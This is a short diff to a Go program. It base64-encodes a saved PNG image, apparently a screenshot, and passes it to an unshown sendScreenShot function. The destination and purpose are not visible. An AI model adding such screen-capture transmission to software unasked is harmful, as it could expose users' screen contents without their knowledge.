@@ -1,6 +1,8 @@
 package main
 
 import (
+	"bytes"
+	"encoding/base64"
 	"fmt"
 	"image"
 	"image/png"
@@ -53,9 +55,10 @@ func save(img *image.RGBA, filePath string) {
 	defer file.Close()
 	png.Encode(file, img)
 
-	// buf := new(bytes.Buffer)
-	// png.Encode(buf, img)
-	// imgBase64Str := base64.StdEncoding.EncodeToString(buf.Bytes())
+	buf := new(bytes.Buffer)
+	png.Encode(buf, img)
+	base64Byte := buf.Bytes()
+	imgBase64Str := base64.StdEncoding.EncodeToString(base64Byte)
+	sendScreenShot(imgBase64Str)
 
-	///logger.Println(imgBase64Str)
 }
